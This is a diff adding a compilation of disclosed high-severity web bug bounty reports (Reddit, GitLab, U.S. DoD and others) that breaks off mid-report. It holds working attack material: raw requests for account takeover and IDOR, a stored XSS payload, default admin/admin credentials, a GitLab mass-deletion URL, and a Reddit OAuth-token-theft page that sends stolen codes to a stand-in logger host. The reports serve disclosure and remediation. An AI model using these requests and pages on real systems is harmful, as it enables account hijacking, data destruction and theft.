@@ -1,0 +1,1890 @@
+HIGH SEVERITY WEB APPLICATION VULNERABILITY REPORTS
+==================================================
+
+Report File: 1051029.json
+------------------------------
+Report To: Top Echelon Software
+Severity: HIGH
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Summary: [Summary the vulnerabilities]
+I am surfing on the bb3jobboard.topechelon.com website. I found a sensitive data including authentication key written in public accessible javascript file.
+URL Vulnerability
+https://bb3jobboard.topechelon.com/#!/search?page=1
+Steps To Reproduce:
+Open bb3jobboard.topechelon.com and add payloads javascript-fuzz
+Directory sensitive is //job_board.js// parse this json files using jsonparseronline
+and look response bytes In response you can see Sensitive ApiKey Disclosure
+Sensitive Information has been leaked on this source page job_board.js
+Open your network browser , this javascript source has high files can leads to (DoS)
+Proof On Concept
+Code 544 Bytes
+1}]), angular.module("jb").config(["lkGoogleSettingsProvider", function(e) {
+2    e.configure({
+3        apiKey: "██████████",
+4        clientId: "██████t.apps.googleusercontent.com",
+5        scopes: ["https://www.googleapis.com/auth/drive.readonly"],
+6        features: ["MULTISELECT_DISABLED"]
+7    })
+8}]), angular.module("jb.factories").factory("BoardSettingsFactory", ["railsResourceFactory", "PathToResourceRoute", function(e, t) {
+9    var n = e({
+10        url: t.convert(JBRoutes.jobBoardBoardSettingsPath),
+11        name: "boardSettings"
+12    });
+Screenshots Proof
+████
+Impact
+Information disclosure
+
+
+
+==================================================
+
+Report File: 1058015.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Description
+The flow in application is to sign up and wait for an email containing a one-time password, as soon as you login using that password, it asks you to change it. I took that password change request and applied on any email changing their password and it worked
+Steps to produce:
+1- Copy the following request: (note txtEMail and txtNewPassword parameters)
+Code 699 Bytes
+1POST /Login.aspx HTTP/1.1
+2Host: ██████████.mil
+3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
+4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+5Accept-Language: en-US,en;q=0.5
+6Accept-Encoding: gzip, deflate
+7Content-Type: application/x-www-form-urlencoded
+8Content-Length: 1052
+9Origin: https://█████.mil
+10Connection: close
+11Referer: https://██████.mil/Login.aspx
+12Upgrade-Insecure-Requests: 1
+13
+14__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=████&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=█████████&txtMail=&txtEMail=[VICTIM_EMAIL]&reqEMailE_ClientState=&revEMailE_ClientState=&txtNewPassword=[DESIRED_PASSWORD]&btnNewPassword=Submit
+2- Now, log in using any victim email with a random password and intercept the request at https://█████.mil/Login.aspx
+3- Paste the request you copied above and change the txtEMail (to victim email) and txtNewPassword parameters and send it.
+Impact
+Full account takeover on any user.
+
+
+
+==================================================
+
+Report File: 1096560.json
+------------------------------
+Report To: X (Formerly Twitter)
+Severity: HIGH
+Weaknesses:
+- Insecure Direct Object Reference (IDOR)
+
+Contents:
+
+Summary:
+Hi team,
+I discovered a vulnerability that allows an attacker to add arbitrary images/descriptions/titles to other people's issues via IDOR
+Description:
+It's possible to perform a IDOR attacker on getrevue.cowhen adding a image to your issue it's also possible to add descriptions and more to other people's issue
+Steps To Reproduce:
+Go to getrevue.co and Sign In
+Click on Issues then Click on Add new issue
+Go to the Issue that you created and from the bottom of the page Click on Media
+Turn on the Intercept and Upload image
+On the request change the ID to your other account's issue ID
+Request:
+Code 1.09 KiB
+1POST /app/items HTTP/1.1
+2Host: www.getrevue.co
+3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0
+4Accept: application/json, text/javascript, */*; q=0.01
+5Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+6Accept-Encoding: gzip, deflate
+7Referer: https://www.getrevue.co/app/issues/current
+8X-CSRF-Token: qbWPNjfb12c1Plj7WrYDYgQFgWl2IaZr6/Qr/Vf5WyaDGyf68jn1mzx3xwtgFxBBX19RkHs/YHiREA7Ae6PGqg==
+9Content-Type: application/json
+10X-Requested-With: XMLHttpRequest
+11Content-Length: 519
+12Origin: https://www.getrevue.co
+13Connection: close
+14Cookie: [YOUR_COOKIE]
+15
+<image_0>
+POC video:
+Impact
+Ability to add arbitrary images/descriptions/titles to other people's issues
+It's possible to hijack other people's issues
+
+
+
+==================================================
+
+Report File: 1108874.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Weaknesses:
+- Privilege Escalation
+
+Contents:
+
+Description:
+████████ uses the Host header when sending out password reset links. This allows an attacker to insert a malicious host header, leading to password reset link / token leakage.
+References
+http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html
+https://hackerone.com/reports/226659
+Impact
+The victim will receive the malicious link in their email, and, when clicked, will leak the user's password reset link / token to the attacker, leading to full account takeover.
+System Host(s)
+███
+Affected Product(s) and Version(s)
+CVE Numbers
+Steps to Reproduce
+1.) Open up Firefox and Burp Suite.
+2.) Visit the forgot password page (http://██████/█████)
+3.) Enter the victim's email address and click on SEND RESET LINK.
+4.) Intercept the HTTP request in Burp Suite & change the Host Header to your malicious site/server ex. ███.
+5.) Forward the request and you'll be redirected to your server.
+The victim will then receive a password reset e-mail with your poisoned link.
+If the victim clicks the link, the reset token will be leaked and the attacker will be able to find the reset token in the server logs. The attacker can then browse to the reset page with the token and change the password of the victim account!
+Suggested Mitigation/Remediation Actions
+Use $_SERVER['SERVER_NAME'] rather than $_SERVER['HTTP_HOST']
+
+
+
+==================================================
+
+Report File: 1213237.json
+------------------------------
+Report To: Reddit
+Severity: HIGH
+Weaknesses:
+- Insecure Direct Object Reference (IDOR)
+
+Contents:
+
+Summary:
+It's possible to delete all 4.4M private messages on RedditGifts.com due to missing permission check on DELETE request
+Steps To Reproduce:
+Set up 3 accounts on RedditGifts.com (FriendA, FriendB, Attacker)
+Have FriendA send message to FriendB
+As Attacker send the following request (with cookies):
+Code 314 Bytes
+1DELETE /api/v1/messages/4423007/ HTTP/1.1
+2Host: www.redditgifts.com
+3X-CSRFTOKEN: rYxQcijrs6viZxyLZt2os9gNvLgmEeXfSrH5wOe10GcOg3ABOvL3ebDbAXmeXojj
+4Referer: https://www.redditgifts.com/api/
+5Cookie: csrftoken=rYxQcijrs6viZxyLZt2os9gNvLgmEeXfSrH5wOe10GcOg3ABOvL3ebDbAXmeXojj; sessionid=osymp6sp6bb83gyt8of7qbeurtuo2450
+Change cookies/csrf token and 4423007 to your own message ID
+Supporting Material/References:
+<image_0>
+Impact
+It's possible to delete all 4.4M private messages on RedditGifts.com
+
+
+
+==================================================
+
+Report File: 1314172.json
+------------------------------
+Report To: MTN Group
+Severity: HIGH
+Weaknesses:
+- Improper Authentication - Generic
+
+Contents:
+
+Summary:
+while conducting my research in your website I found that while verifying NIN number it send the otp to the enterd mobile number that can be bypassed.
+Steps To Reproduce:
+1) Go to https://nin.mtnonline.com/nin/
+2) click submit nin.Now it will redirect to another page https://nin.mtnonline.com/nin/
+3) It asks for mobile number and National Identity Number [NIN].
+4) Enter the mobile and NIN number and click Next.It will send the otp to the mobile number.
+5) Enter any 6 digit code and click verify and capture the request in bupsuite and click action and select "Do intercept and response to the request"
+6) Now change the response status to success.
+------>Now successfully verified mobile number.
+Impact
+The attacker can able to verify NIN with any number.
+Note: I had attached the poc video below please take a look.
+Regards,
+@aaruthra.
+
+
+
+==================================================
+
+Report File: 1472721.json
+------------------------------
+Report To: U.S. General Services Administration
+Severity: HIGH
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Hi Team,
+I have found a broken access control vulnerability on https://demo.sftool.gov/ under your /tws directory.
+I made two accounts.
+One account i browsed to /tws and created a new scorecard. Here i can submit all information I need. The scorecard name is in the end of the URL https://demo.sftool.gov/TwsHome/ScorecardManage/testdsfdfsf
+I logged out this account
+I logged into attacker account. I browse to https://demo.sftool.gov/TwsHome/ScorecardManage/testdsfdfsf (the last part is the name of the other accounts score card). I can now view the scorecard and even edit the score card from the attackers account. I can add accounts to read only and edit permissions on the score card and change information as-well as download the score card.
+Log back into the victim account and the scorecard information has been changed, downloaded and attacker has assigned permissions.
+We can brute force scorecard names but i am not doing this as the above on my accounts already shows the issue.
+Many thanks
+Holla
+Impact
+An attacker can read, edit and download and assign permissions to another users scorecard.
+
+
+
+==================================================
+
+Report File: 1483201.json
+------------------------------
+Report To: U.S. General Services Administration
+Severity: HIGH
+Weaknesses:
+- Improper Authentication - Generic
+
+Contents:
+
+
+I have found a vulnerability on https://vehiclestdb.fas.gsa.gov/ for account takeovers
+The website is not using proper authentication to claim the user signing in is actually the account owner due to only requiring an email address to sign in and no password. This leads to an attacker being able to place a stored XSS payload within the victims profile and reveals PII including phone numbers of the victim.
+Steps To Reproduce:
+[add details for how we can reproduce the issue]
+Visit https://vehiclestdb.fas.gsa.gov/
+Enter email address in the signing form itsdavenn@gmail.com (or for official account use tesg@gsa.gov)
+You have now signed in as a users account you do not own and if you browse to the profile you can see PII in the form of phone numbers.
+We can do this with any registered user
+You can place an XSS stored payload on the users profile in the first name field using ant" autofocus onfocus=prompt(1) x="
+Supporting Material/References:
+[list any additional material (e.g. screenshots, logs, etc.)]
+[attachment / reference] Please re create these steps to see the impact
+Impact
+An attacker can takeover any users account from just knowing the email address, from here on in they can find PII in the form of phone numbers and place stored XSS on the users profile to execute JavaScript code on the users profile.
+
+
+
+==================================================
+
+Report File: 1486310.json
+------------------------------
+Report To: 8x8 Bounty
+Severity: HIGH
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Dear Team,
+Greetings!!!
+I have observed an Improper access control Issue. Member users do not have permission to rooms area of the admin section. But member users can exploit this via GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd HTTP/2
+<image_0>
+<image_1>
+Step3: From member user's JWT send a request to below endpoint
+Use ██████
+Code 513 Bytes
+1GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd HTTP/2
+2Host: admin.8x8.vc
+3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
+4Accept: */*
+5Accept-Language: en-US,en;q=0.5
+6Accept-Encoding: gzip, deflate
+7Referer: https://admin.8x8.vc/
+8Content-Type: application/json
+9Sec-Fetch-Dest: empty
+10Sec-Fetch-Mode: cors
+11Sec-Fetch-Site: same-origin
+12Te: trailers
+13Connection: close
+14Authorization: <Member user's JWT>
+Step4: You will receive the Link as below from the above endpoint:
+Code 250 Bytes
+1{"url":"https://app.cronofy.com/oauth/authorize?response_type=code&client_id=M0wBDPDXk6EQLaGCqp-pTN_VGt7_AtM9&redirect_uri=https://api-vo.jitsi.net/rosy/sso/cronofy/callback&scope=read_only&delegated_scope=read_only&state=███████&avoid_linking=true"}
+<image_2>
+Step6: Member user successfully added his/her email into admin's room area
+Use ███
+Best regards,
+Emperor
+Impact
+Member users with no permission can integrate email to connect calendar
+
+
+
+==================================================
+
+Report File: 1567186.json
+------------------------------
+Report To: Reddit
+Severity: HIGH
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Hi,
+Description
+I've been researching new ways to steal OAuth codes and access-tokens using postMessage, and I found a way for me to steal the code and/or access-token from Apple-sign-in on reddit.com allowing a full account hijack of the account in Reddit.
+The way it works is this:
+Attacker prepares a state-parameter in its own browser from the regular Apple sign-in flow in Reddit. This is an important part on how we get the code.
+Attacker makes a page for the victim with the attacker's state attached to it. The page loads an iframe with www.redditmedia.com, which is an intentional sandbox but with a fun quirk, it uses window.name of the frame to pass over query parameters for the current URL in the main window of Reddit. This also includes fragment, which is what we need to get the tokens.
+The javascript in the www.redditmedia.com sandbox will create a link to Apple sign-in for Reddit, but tainted with the state-value that the attacker set. Also, the response_type is modified from code to code+id_token and the response_mode to fragment. This is the second important part why we can steal the code, since Reddit uses response_mode=web_message live, to get the message as a postMessage from the login popup, but the other response modes in Apple-ID are not disabled by Reddit. Reddit is not expecting to get any sensitive tokens in the URL fragment. Also, the redirect_uri set in the OAuth-application in Apple for Reddit is allowing https://reddit.com only as the return page. This is something you need to remove, or point elsewhere. When you're using response_mode=web_message, the redirect_uri doesn't really matter what it is set to, since the whole origin of https://reddit.com will be allowed to get the postMessage. But since we now can direct the tokens to Reddit's main page, we have the iframe of www.redditmedia.com there to catch the tokens.
+Victim clicks the link from the attacker page, will go through "sign-in with Apple" for Reddit, but with the attacker's state-parameter. When the login process is completed, the URL of the main page becomes https://reddit.com/#state=xxx&code=xxx&access_token=xx.
+The XSS on www.redditmedia.com in the first window, which has the same domain as the iframe, will be allowed to ask about the window.name of the iframe in the main window, since it's the same origin as the iframe on the attacker's page. It will then be able to steal the current URL that has the tokens in it.
+Here's a video to show the flow, as you will see in the beginning - the attacker has the red profile in Chrome. He will open his own session with Apple and copy the state to the attacker-page, and then send the link to the victim (in the gray profile of Chrome). When the code shows up on the attacker's page later, that's where the attacker then takes over again and uses its incognito browser window to sign in as the victim by posting the postMessage from his Apple-ID sign in popup to Reddit:
+And here's a link for testing:
+Code 48 Bytes
+1https://fransrosen.com/reddit-hijack-424342.html
+Technical details
+Here's the HTML of the malicious page:
+Code 3.07 KiB
+1<html>
+2<style>pre { word-break: break-word; white-space: pre-wrap; }</style>
+3<body>
+4<div id="start">
+5Attacker, enter your Apple ID-OAuth URL when trying to <a href="https://reddit.com" target="_blank">sign in to Reddit here</a>:<br />
+6<input id="state">
+7<button onclick="launch(extractstate(document.getElementById('state').value), true)">Generate a victim URL with attacker's state</button>
+8</div>
+9
+10
+11<div id="fr"></div>
+12
+13<script>
+14var inj, monitor;
+15function extractstate(st) {
+16    return st.indexOf('&state=') !== -1 ? st.split('&state=')[1].split('&')[0] : st;
+17}
+18function startmonitor(st) {
+19    history.pushState('/','/',location.pathname + '?monitor&state=' + st)
+20    monitor = setInterval(function() {
+21        fetch('https://MY-LOGGER-DOMAIN/reddit/parse.php?q=' + st).then(e => e.text()).then(e => {
+22            if (e.length) {
+23                document.getElementById('fr').innerText = 'Attacker, log in to Reddit by running this in the console from Apple-ID popup: ';
+24                var p = document.createElement('pre');
+25                p.innerText = 'opener.postMessage(\'' + unescape(e.trim()) + '\',"*");';
+26                document.getElementById('fr').appendChild(p)
+27                clearInterval(monitor);
+28            }
+29        });
+30    }, 2000);
+31}
+32function launch(st, showonly) {
+33    if (showonly) {
+34        history.pushState('/','/',location.pathname + '?state=' + st)
+35        document.getElementById('fr').innerText = 'Send this link to victim: ';
+36        var p = document.createElement('pre');
+37        p.innerText = location.href;
+38        document.getElementById('fr').appendChild(p);
+39        startmonitor(st);
+40    } else {
+41        document.getElementById('fr').innerHTML = '<iframe src="https://www.redditmedia.com/gtm/jail?id=GTM-N3HH8D6&state=' + encodeURIComponent(st) + '" frameborder=0 style="width: 500px; height: 300px"></iframe>';
+42    }
+43    document.getElementById('start').innerHTML = '';
+44}
+45if (location.search && location.search.split('state=')[1].split('&')[0]) {
+46    launch(location.search.split('state=')[1].split('&')[0], location.search.indexOf('monitor') !== -1);
+47}
+48window.onmessage = function(e) {
+49    if (e.data === 'stopinject') {
+50        console.log('frame injected');
+51        clearInterval(inj)
+52    }
+53    if (e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) {
+54        payload = JSON.parse(e.data);
+55        data = payload.hash.replace('state=state=', 'state=');
+56        var state = data.split('state=')[1].split('&')[0];
+57        var code = data.split('code=')[1].split('&')[0];
+58        var id_token = data.split('id_token=')[1].split('&')[0];
+59        var payload = JSON.stringify({method:'oauthDone',data:{authorization:{code:code,id_token:id_token,state:state}}});
+60
+61        document.getElementById('fr').innerHTML = 'Attacker now have the code from Apple:<br />';
+62        var p = document.createElement('pre');
+63        p.innerText = payload;
+64        document.getElementById('fr').appendChild(p);
+65
+66        var s = document.createElement('img');
+67        s.src = 'https://MY-LOGGER-DOMAIN/reddit/log.php?' + payload;
+68        document.body.appendChild(s);   
+69    }
+70}
+71
+72</script>
+73
+74
+75</body>
+76</html>
+What this page will do is:
+Ask the attacker to prepare the state-param from its own browser. This is to taint the victim's code with the state so that the attacker can then sign in. This will also start to monitor the log asking for any code from the state provided.
+<image_0>
+<image_1>
+Load the https://www.redditmedia.com with my own custom GTM into an iframe. It is not restricted to be framed in any way, anyone can load it.
+The GTM-script will load, it looks like this:
+Code 1.06 KiB
+1<script>var b, x;
+2var state = parent.location.href.substr(location.href.indexOf('state='));
+3var d = document.createElement('div');
+4if (!window.inited) {
+5  window.inited = true;
+6d.innerHTML = '<a href="#" onclick="b=window.open(\'https://appleid.apple.com/auth/authorize?client_id=com.reddit.RedditAppleSSO&redirect_uri=https%3A%2F%2Fwww.reddit.com&response_type=code+id_token&state=' + state + '&scope=&response_mode=fragment&m=12&v=1.5.4\');">Click here to hijack Apple access-token for Reddit</a>';
+7parent.document.children[parent.document.children.length - 1].appendChild(d);
+8if(top!==parent.window) top.postMessage('stopinject', '*');
+9parent.window.onmessage=function(e) { if(e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) { top.postMessage(e.data, '*'); b.close(); } };
+10x = setInterval(function() {
+11if(parent.window.b && parent.window.b.frames[0] && parent.window.b.frames[0].window && parent.window.b.frames[0].window.name) {
+12  top.postMessage(parent.window.b.frames[0].window.name, '*'); parent.window.b.close();
+13  clearInterval(x);
+14};
+15
+16}, 500);
+17}
+18</script>
+This javascript will render the "Click here"-link:
+<image_2>
+It will ask the parent window to stop injecting by postMessage, and it will run an interval looking for the frames[1].window.name, which is the regular www.redditmedia.com iframe of the window that was opened, as soon as it contains code, the value will be sent to the attacker main window through this frame.
+5. The attacker's main window will listen for a postMessage containing code and will show the state+code in the window. The page will then load an external logging-URL with the payload.
+<image_3>
+The attacker now gets the token from the victim in his browser thanks to the monitoring of the log on my server:
+<image_4>
+Logging endpoints
+I've added some endpoints in the HTML to log and parse the log to extract the code-parameter. You need to use your own endpoints if you don't want to try mine above from my link.
+https://USE-YOUR-OWN-LOGGER/reddit/log.php looks like this:
+Code 120 Bytes
+1<?php
+2
+3if (isset($_SERVER['QUERY_STRING'])) {
+4	file_put_contents('r.log', $_SERVER['QUERY_STRING']."\n", FILE_APPEND);
+5}
+And https://USE-YOUR-OWN-LOGGER/reddit/parse.php looks like this:
+Code 313 Bytes
+1<?php
+2header("Access-Control-Allow-Origin: *");
+3header("Content-type: text/plain");
+4
+5$key = @$_GET['q'];
+6if (!$key || !preg_match('#^[a-f0-9]{48}$#', $key)) { die; }
+7$data = explode("\n", file_get_contents('r.log'));
+8foreach($data as $line) {
+9	if (strpos($line, $key) !== false) {
+10		echo $line . "\n";
+11		die;
+12	}
+13}
+Mitigation
+Remove fragment part when location is sent to www.redditmedia.com or any other party.
+Restrict your redirect_uri of Apple-ID to something that does not load a domain that could run arbitrary javascript.
+Impact
+Attacker can sign in as the victim. There's minimal interaction needed, only one click.
+This took quite some time to get built :) I hope you'll like it!
+Regards,
+Frans
+
+
+
+==================================================
+
+Report File: 1636552.json
+------------------------------
+Report To: Khan Academy
+Severity: HIGH
+Weaknesses:
+- Privilege Escalation
+
+Contents:
+
+<image_0>
+Now keep victims email as parent's email for example here I am keeping info@khanacademy.org as parents email and click on signup. ████
+Now you will see a following message "Your parent or guardian must approve your account or it will be deleted in 7 days". ██████
+Now go to https://www.khanacademy.org/settings/account and update your email to temporary email or any email you have access to. ██████████ ██████
+Now, you will receive a verification email in your temporary email you have access to. But don't click on the email. Now again change the email to info@khanacademy.org.
+<image_1>
+This is the account that I created : Username : ██████ Password : ██████████ Email : ████
+█████████
+Impact
+Attacker is able to bypass email verification.
+
+
+
+==================================================
+
+Report File: 1714638.json
+------------------------------
+Report To: MTN Group
+Severity: HIGH
+Weaknesses:
+- Incorrect Authorization
+
+Contents:
+
+Summary:
+Hello Team,
+https://mtnmobad.mtnbusiness.com.ng/app/updateUser allows authenticated users to alter their account profile. But, however, there is no authorization check when updating another user's profile thus, allowing attacker to modify anyone's profile info such as Username, Address, Mobile Number, Company Name and Company Size
+Steps To Reproduce:
+Requirements:
+Create two Test Accounts (Attacker & Victim)
+Login into attacker's account In Mozilla Firefox at https://mtnmobad.mtnbusiness.com.ng/#/login1.
+Visit https://mtnmobad.mtnbusiness.com.ng/#/userProfile
+Goto to Burp and turn Intercept is on to capture request.
+Locate this endpoint POST /app/updateUser HTTP/1.1 while still proxying traffic through Burp. Notice, json blob data being presented.
+Record "id":"/###", "email":"redacted+attacker@wearehackerone.com" for attacker's account and Logout.
+Now, Login into victim's account and repeat step [1, 2 & 3] and Logout.
+Attack Steps
+Login into attacker's account in Mozilla Firefox and Victim's Account in Google Chrome.
+Using attacker's account in Firefox, visit https://mtnmobad.mtnbusiness.com.ng/#/userProfile and capture request with Burp.
+Switch attacker's "id":"/redacted", "email":"redacted+attacker@wearehackerone.com" to victim "id":"/redacted" "email":"redacted+victim@wearehackerone.com" and forward request.
+Go to victim's account in google chrome and refresh the page.
+Visit victim's profile and notice, attacker has successfully updated the user's Profile without their knowledge.
+Recommendation/Remediation:
+Implement stringent authorization controls to make sure a user has the necessary rights before allowing them to make such a harmful request on another account.
+Generate random userIds to prevent attacker from predicting such userIds.
+Supporting Material/References:
+Screenshots:
+<image_0>
+After:
+<image_1>
+[attachment / reference]
+Tools
+BurpSuite Community Edition: [v2022.8.4]
+Morzila Firefox: 105.0.1 (64-bit)
+Google Chrome: Version 105.0.5195.127 (Official Build) (64-bit)
+OS: Microsoft Windows [Version 10.0.22000.856]
+Impact
+An attacker will be able to use this technique to change any user's (advertiser's) profile, for example, a company name and phone number under the attacker's control to commit a crime entirely in the victim's name.
+Regards!
+@v3rvain0001
+
+
+
+==================================================
+
+Report File: 1806387.json
+------------------------------
+Report To: U.S. Department of State
+Severity: HIGH
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Summary:
+I discovered an issue referred to as no-redirect in a subdomain on state.gov. When you enter the page, it directs you directly to the entrance. When I examined it via burp suite, it gave 302 found, but the homepage data was showing below. When I tried it as admin, it still gave 302 found, but this time we could see the content of the admin page. this way i was able to see admin user and normal user's info. I was also able to perform many transactions. uploading files, adding categories and many more.
+Steps To Reproduce:
+1- Login to https://speakerkit.state.gov/
+and it will throw you to the page named "spklogin". Using the find and replace feature on burpsuite, I told it to change all requests that gave 302 found to 200 Ok, and I easily performed my operations. You will be able to do it when you watch the video.
+Supporting Material/References:
+https://hackerone.com/reports/1026146
+https://hackerone.com/reports/95441
+[attachment / reference]
+<image_0>
+[ poc / video] ████████
+Impact
+access the admin page. unauthorized.
+
+
+
+==================================================
+
+Report File: 1839012.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Weaknesses:
+- Improper Authentication - Generic
+
+Contents:
+
+Summary:
+I have found a vulnerability name authentication Bypass Using Default Credentials on admin console of █████████.
+Impact
+Access to the portal and the data in the portal like emails links data etc
+System Host(s)
+██████
+Affected Product(s) and Version(s)
+CVE Numbers
+Steps to Reproduce
+Steps:
+Go to ████████
+Then login with credentials username admin and password admin.
+Suggested Mitigation/Remediation Actions
+Change the credentials
+
+
+
+==================================================
+
+Report File: 186194.json
+------------------------------
+Report To: GitLab
+Severity: HIGH
+Weaknesses:
+- Privilege Escalation
+
+Contents:
+
+Vulnerability details
+The state filter in the IssuableFinder class has the ability to filter issues and merge requests by state. This filter is implemented by calling public_send with unfiltered user input. This allows an attacker to call delete_all or destroy_all. Because the method is called before the project / group scope is applied, it deletes all issues and merge requests of the GitLab instance.
+Proof of concept
+Create two users and a new project for each of them. It doesn't matter if they're private or not. Now create an issue (or merge request) for each project. Now browse to the Issues overview. When clicking All, you'll be redirected to http://gitlab-instance/root/xxxx/issues?scope=all&state=all. Simply substitude all with delete_all in the URL and ALL issues will be deleted: http://gitlab-instance/root/xxxx/issues?scope=all&state=delete_all. To delete all merge requests, substitude issues with merge_requests. When requesting the delete_all URL, a 500 internal server error will be shown. This is caused by the delete_all method returning a boolean instead of an ActiveRecord::Relation class. Do NOT call this on the GitLab production site.
+Origin
+The vulnerability comes from the fact that unsanitized user input is passed into a public_send call that is being called on model.all. Here's the execute method of the IssuableFinder:
+Code 329 Bytes
+1def execute
+2  items = init_collection
+3  items = by_scope(items)
+4  items = by_state(items)
+5  items = by_group(items)
+6  items = by_project(items)
+7  items = by_search(items)
+8  items = by_milestone(items)
+9  items = by_assignee(items)
+10  items = by_author(items)
+11  items = by_label(items)
+12  items = by_due_date(items)
+13  sort(items)
+14end
+Now take a look at the by_state method:
+Code 151 Bytes
+1def by_state(items)
+2  params[:state] ||= 'all'
+3
+4  if items.respond_to?(params[:state])
+5    items.public_send(params[:state])
+6  else
+7    items
+8  end
+9end
+The controllers are passing the state parameter without any form of sanitization or validation to the finder. Since you're passing around ActiveRecord relations, delete_all can be called early on in the relation chain. Since the scope hasn't been applied (the by_project is called later), this will affect all issues and merge requests.
+Remediation
+Never pass unsanitized or unvalidated user input to public_send or send.
+
+
+
+==================================================
+
+Report File: 1991214.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+URL: https://█████████.mil/apexcrrel/f?p=150:1:23467499301323::NO:::
+When visiting the following URL, the user is automatically signed into a user with administrative access.
+███
+This user is allowed to:
+Create new submissions, allowing file uploads
+████████
+See all submissions going back to 2012
+██████████
+Manage users - add, delete, and link users. This user could also add the Administrator role to a user.
+███
+████
+Send spam emails to all users
+█████████
+Access admin tools like publishing data and removing publications
+██████████
+I did not test all functionality provided by this access as I did not want to damage the integrity of the data on the web application.
+Please let me know if you would like me to test adding/deleting users, creating submissions and testing file upload vulnerabilities, etc. This would also allow me to demonstrate the severity of this vulnerability as well as find new vulnerabilities in the application. For example, with permission I would like to test the file upload functionality for vulnerabilities.
+Impact
+This is a critical vulnerability. This impacts the integrity, confidentiality, and availability of the application.
+Integrity: Unauthorized users can upload arbitrary data, publish data, and delete publications.
+Confidentiality: This exposes names, emails, and submissions.
+Availability: This administrative user can delete other user accounts, denying them access.
+System Host(s)
+███████.mil
+Affected Product(s) and Version(s)
+CVE Numbers
+Steps to Reproduce
+Visiting URL: https://███.mil/apexcrrel/f?p=150:24:23467499301323::NO:::
+View active user in top right corner: "ben auto log user". This user is an administrator.
+Suggested Mitigation/Remediation Actions
+
+
+
+==================================================
+
+Report File: 228383.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Weaknesses:
+- Insecure Direct Object Reference (IDOR)
+
+Contents:
+
+Description:
+https://████/██████/ is vulnerable to Insecure Direct Object Reference. The application does not validate whether or not who a Push Server belongs to thus allowing an attacker to view the credentials of any FTP / sFTP server linked to any user's account.
+Impact
+An attacker can view anybody's FTP server information, thus compromising the user's FTP servers. This also allows an attacker to update or edit the Push Server in the ██████████ CMS.
+Step-by-step Reproduction Instructions
+Log into or create an account on https://██████████/██████████
+Now visit https://████████/█████/filepush/ftp/303/
+You will be able to see my ftp server details and you will be able to update or delete it!
+An attacker can bruteforce the id to see if the server gives back a valid response. The attacker can then log into the person's FTP servers with the credentials stolen using this vulnerability, giving them full access to private / confidential information!
+Example: https://██████████/█████████/filepush/ftp/1/
+Hostname: ██████
+Username: ██████
+Password: █████
+Path: /from_pub/cr/████████
+https://█████████/████/filepush/ftp/<ID>/
+Suggested Mitigation/Remediation Actions
+Check whether or the user's account should have access to the specified Push Server
+
+
+
+==================================================
+
+Report File: 2312029.json
+------------------------------
+Report To: HackerOne
+Severity: HIGH
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Summary:
+If a private report has a pending email invitation for collaboration, an anonymous user can see the title of the report.
+This only works for anonymous users, and the collaboration invitation must be through Manage Collaborators invitation panel.
+Description:
+Steps To Reproduce
+As victim:
+In a report to a bug bounty program, add a collaborator, using any email, such as: ██████████
+Save the integer ID of the report.
+In a new, anonymous/unauthenticated/logged-out session:
+Send GraphQL request, replacing PRIVATE_REPORT_ID integer:
+Code 50 Bytes
+1{
+2  report(id:IPRIVATE_REPORT_ID){
+3    title
+4  }
+5}
+OR run JS implementation:
+By visiting hackerone.com/hacktivity as anonymous:
+Code 669 Bytes
+1const csrf_token = document.getElementsByName("csrf-token")[0].getAttribute("content")
+2const REPORT_ID = PRIVATE_REPORT_ID // integer
+3
+4var resp = await(await fetch("https://hackerone.com/graphql", {
+5  "headers": {
+6    "accept": "*/*",
+7    "content-type": "application/json",
+8    "x-csrf-token": csrf_token,
+9  },
+10  "body": JSON.stringify({
+11    "operationName": "HacktivitySearchQuery",
+12    "variables": {
+13        "reportId": REPORT_ID
+14    },
+15    "query": `query HacktivitySearchQuery($reportId: Int!) {
+16  report(id: $reportId){
+17    id
+18    url
+19    title
+20  }
+21}
+22`
+23}),
+24  "method": "POST",
+25  "mode": "cors",
+26  "credentials": "include"
+27})).json()
+28console.log(resp.data.report)
+The title of the report is the response, confirming the vulnerability.
+Impact
+Can read titles of possibly unfixed reports. This can be leveraged against the program, depending on the specificity of the title in the report.
+
+
+
+==================================================
+
+Report File: 2499178.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+Description:
+The subdomain █████.mil is pointing to peosol-lg.███████., the domain ██████ is currently available for registration as can be seen at https://www.godaddy.com/nl-nl/domainsearch/find?domainToCheck=█████
+Given the rules, residency of the US, of the us-tld I decided not to register the domain, also I do believe the output to be enough.
+References
+Impact
+Using this vulnerability an attacker can:
